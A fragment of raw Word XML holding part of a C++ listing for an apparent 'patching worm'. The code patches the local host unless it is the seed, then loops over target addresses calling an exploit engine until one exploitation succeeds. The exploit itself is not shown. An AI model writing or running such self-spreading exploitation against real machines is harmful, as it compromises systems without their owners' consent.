          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">191         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">192         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Patch this local machine (unless flagged as seed)</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">193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(!Configuration::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>isRootSeed</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194                 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Update it</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>195                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Applying OS patch to this machine"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196                 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">197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198 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">                * Standard Windows patch update command options</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">199 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">                * </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">200 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">                * -u = unattended</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">201 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">                * -z = no reboot</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">202 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">                * -q = </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">203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204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cmdLine</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> = Configuration::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>updateBinaryFullPathname</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-u -z -q"</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205                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"DEBUG:</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>\t</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cmdLine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206                 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">207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osUpdateReturnCode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> = system(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>cmdLine.c_str</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208                 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">209                 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">// Return code for unattended install is expected to be 3010 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>(ERROR_SUCCESS_REBOOT_REQUIRED) for success</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">210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 xml:space="preserve">(3010 != </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>osUpdateReturnCode</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211                         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"ERROR:  Application of update returned error exit code of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osUpdateReturnCode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212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213                         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"OS update patch applied successfully"</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214                         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Machine may need to be rebooted for patch to take affect"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215                 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">216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217                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Worm running as seed so not executing OS update patch for this machine"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218         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">219         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">220         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">221         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Try the first target (and only 1 successful target).  Loop until a successful exploit.</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">222         Exploit </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>exploitEngine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223         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>while</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(!Configuration::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>targets</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.empty</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224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targetAddress</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> = Configuration::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>targets</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.front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225                 Configuration::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>targets</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.pop_front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226 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>227                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Attempting target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targetAddress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228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exploitEngine.exploit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targetAddress</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229                         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Successfully exploited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targetAddress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230                         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>break</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231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232                         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Unsuccessful"</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233                 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t>234         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">235         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">236         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">237         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>delete</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(logger);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">238         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">239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2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>EXIT_SUCCESS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240 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
